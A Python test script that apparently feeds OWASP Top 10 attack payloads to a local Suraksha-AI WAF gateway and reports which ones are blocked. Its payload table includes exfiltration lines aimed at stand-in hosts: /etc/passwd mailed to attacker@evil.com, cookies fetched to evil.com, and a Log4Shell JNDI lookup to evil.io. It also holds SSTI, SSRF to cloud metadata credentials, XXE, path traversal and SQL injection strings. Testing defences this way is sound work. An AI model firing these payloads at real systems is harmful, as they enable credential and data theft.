"""
Suraksha-AI Interactive Threat Simulator CLI
============================================
Allows triggering any specific OWASP Top 10 threat vector against Suraksha-AI
with zero shell-quoting errors or syntax issues.

Usage:
    python test_attack.py crypto
    python test_attack.py ssti
    python test_attack.py command
    python test_attack.py xss
    python test_attack.py ssrf
    python test_attack.py all
    python test_attack.py --list
"""

import sys
import json
import urllib.request
import urllib.error

GATEWAY_URL = "http://127.0.0.1:5000/api/target/telemetry"

VECTORS = {
    "crypto": {
        "name": "Cryptographic Failures (A02:2021)",
        "source_app": "Production API",
        "url": "/api/crypto/negotiate",
        "method": "POST",
        "payload": "cipher=DES&key_length=56",
        "client_ip": "198.51.100.55",
        "desc": "Insecure legacy cipher downgrade (DES 56-bit key)"
    },
    "crypto-pii": {
        "name": "Cryptographic Failures - Plaintext PII (A02:2021)",
        "source_app": "Production API",
        "url": "/api/customer/pii",
        "method": "POST",
        "payload": "ssn=432-11-9087&store_plain=true",
        "client_ip": "198.51.100.88",
        "desc": "Request to store unencrypted Social Security Number"
    },
    "crypto-export": {
        "name": "Cryptographic Failures - Unmasked PAN (A02:2021)",
        "source_app": "Production API",
        "url": "/api/export/ledger",
        "method": "POST",
        "payload": "field=credit_card_number&mask=false",
        "client_ip": "198.51.100.77",
        "desc": "Request to export unmasked raw credit card numbers"
    },
    "ssti": {
        "name": "Server-Side Template Injection (A03:2021)",
        "source_app": "Production API",
        "url": "/api/render/template",
        "method": "POST",
        "payload": "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
        "client_ip": "198.51.100.12",
        "desc": "Jinja2 Python sandbox escape / RCE template payload"
    },
    "command": {
        "name": "OS Command Injection (A03:2021)",
        "source_app": "Production API",
        "url": "/api/tools/ping",
        "method": "POST",
        "payload": "127.0.0.1; cat /etc/passwd | mail attacker@evil.com",
        "client_ip": "185.220.101.5",
        "desc": "Shell command chaining with pipe and metacharacters"
    },
    "xss": {
        "name": "Cross-Site Scripting - XSS (A03:2021)",
        "source_app": "Production API",
        "url": "/api/comments/new",
        "method": "POST",
        "payload": "<script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
        "client_ip": "192.0.2.88",
        "desc": "Reflected / Stored DOM session stealing script"
    },
    "ssrf": {
        "name": "Server-Side Request Forgery - SSRF (A10:2021)",
        "source_app": "Production API",
        "url": "/api/fetch/url",
        "method": "POST",
        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "client_ip": "203.0.113.77",
        "desc": "AWS / Cloud metadata instance profile credential harvesting"
    },
    "traversal": {
        "name": "Path Traversal / LFI (A05:2021)",
        "source_app": "Production API",
        "url": "/api/files/download",
        "method": "GET",
        "payload": "../../../../etc/shadow",
        "client_ip": "198.51.100.99",
        "desc": "Directory climbing arbitrary sensitive file retrieval"
    },
    "redirect": {
        "name": "Open Redirect (A01:2021)",
        "source_app": "Production API",
        "url": "/api/auth/login",
        "method": "GET",
        "payload": "redirect=https://evil-phishing-portal.com/login",
        "client_ip": "203.0.113.4",
        "desc": "Unvalidated external phishing destination redirect"
    },
    "sqli": {
        "name": "SQL Injection - Auth Bypass (A03:2021)",
        "source_app": "Production API",
        "url": "/api/target/login",
        "method": "POST",
        "payload": "admin' OR 1=1 --",
        "client_ip": "185.220.101.99",
        "desc": "Tautology boolean authentication bypass"
    },
    "xxe": {
        "name": "XML External Entity - XXE (A03:2021)",
        "source_app": "Production API",
        "url": "/api/xml/upload",
        "method": "POST",
        "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "client_ip": "203.0.113.15",
        "desc": "DOCTYPE entity injection system file disclosure"
    },
    "bac": {
        "name": "Broken Access Control - IDOR (A01:2021)",
        "source_app": "Production API",
        "url": "/api/users/profile",
        "method": "POST",
        "payload": '{"user_id":"1","role":"admin","isAdmin":"true"}',
        "client_ip": "198.51.100.42",
        "desc": "Privilege escalation and unauthorized role reassignment"
    },
    "design": {
        "name": "Insecure Design - Business Logic Abuse (A04:2021)",
        "source_app": "Production API",
        "url": "/api/cart/checkout",
        "method": "POST",
        "payload": "quantity=-5&price=0.01",
        "client_ip": "198.51.100.61",
        "desc": "Negative quantity and client-side pricing tampering on checkout"
    },
    "misconfig": {
        "name": "Security Misconfiguration - Exposed .env (A05:2021)",
        "source_app": "Production API",
        "url": "/.env",
        "method": "GET",
        "payload": "/.env",
        "client_ip": "198.51.100.62",
        "desc": "Probing for exposed server environment configuration file (.env)"
    },
    "misconfig-git": {
        "name": "Security Misconfiguration - Exposed .git (A05:2021)",
        "source_app": "Production API",
        "url": "/.git/config",
        "method": "GET",
        "payload": "/.git/config",
        "client_ip": "198.51.100.64",
        "desc": "Probing for exposed Git source code metadata (.git/config)"
    },
    "cve": {
        "name": "Vulnerable and Outdated Components - Log4Shell (A06:2021)",
        "source_app": "Production API",
        "url": "/api/gateway/search",
        "method": "POST",
        "payload": "${jndi:ldap://evil.io/a}",
        "client_ip": "198.51.100.63",
        "desc": "Log4Shell (CVE-2021-44228) JNDI lookup injection attack"
    },
    "struts": {
        "name": "Vulnerable and Outdated Components - Apache Struts (A06:2021)",
        "source_app": "Production API",
        "url": "/struts2-showcase/",
        "method": "GET",
        "payload": "${struts.valueStack}",
        "client_ip": "198.51.100.65",
        "desc": "Apache Struts OGNL remote execution probe (CVE-2017-5638)"
    }
}

def send_attack(key, item):
    print("=" * 75)
    print(f"[*] Simulating: {item['name']}")
    print(f"[*] Description: {item['desc']}")
    print(f"[*] Target URI : {item['url']} ({item['method']})")
    print(f"[*] Payload    : {item['payload']}")
    print(f"[*] Client IP  : {item['client_ip']}")
    print("-" * 75)

    post_data = {
        "source_app": item["source_app"],
        "url": item["url"],
        "method": item["method"],
        "payload": item["payload"],
        "client_ip": item["client_ip"],
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SurakshaTest/2.0"
    }

    req = urllib.request.Request(
        GATEWAY_URL,
        data=json.dumps(post_data).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=6.0) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[!] RESULT     : ALLOWED (HTTP {resp.status})")
            print(json.dumps(data, indent=2))
    except urllib.error.HTTPError as e:
        raw_body = e.read().decode("utf-8")
        try:
            data = json.loads(raw_body)
            info = data.get("data", {})
            print(f"[+] DEFENSE VERDICT : [403 BLOCKED 🛡️]")
            print(f"    • Attack Pattern : {info.get('attack_category', 'Threat Detected')}")
            print(f"    • OWASP Standard : {info.get('owasp_id', 'A03:2021')}")
            print(f"    • Threat Level   : {info.get('threat_level', 'High')}")
            print(f"    • Risk Score     : {info.get('risk_score', 'N/A')}")
            print(f"    • Defense Agent  : {info.get('defense_agent', 'Suraksha WAF')}")
            print(f"    • Shield Barrier : {info.get('shield_type', 'Default Shield')}")
            print(f"    • Intercept Note : {info.get('reason', '')}")
            print(f"    • Remediation    : {info.get('remediation', '')}")
            print("[+] Successfully logged to Suraksha-AI dashboard at http://localhost:5173/")
        except Exception:
            print(f"[+] HTTP {e.code} BLOCKED: {raw_body}")
    except Exception as ex:
        print(f"[-] Connection Error: {str(ex)}")
        print("[-] Ensure Suraksha-AI backend is running on http://127.0.0.1:5000")
    print("=" * 75)

def print_help():
    print("\nSuraksha-AI Threat Simulation CLI")
    print("---------------------------------")
    print("Available attack vector keys:")
    for k, v in VECTORS.items():
        print(f"  python test_attack.py {k:<15} -> {v['name']}")
    print("  python test_attack.py all             -> Runs all vectors in sequence\n")

if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help", "--list"):
        print_help()
        sys.exit(0)

    arg = sys.argv[1].lower().strip()

    aliases = {
        "insecure-design": "design",
        "misconfiguration": "misconfig",
        "outdated": "cve",
        "vulnerable": "cve",
        "log4j": "cve",
        "log4shell": "cve"
    }
    target_key = aliases.get(arg, arg)

    if target_key == "all":
        for k in VECTORS:
            send_attack(k, VECTORS[k])
    elif target_key in VECTORS:
        send_attack(target_key, VECTORS[target_key])
    else:
        print(f"[!] Unknown attack key '{arg}'.")
        print_help()
        sys.exit(1)

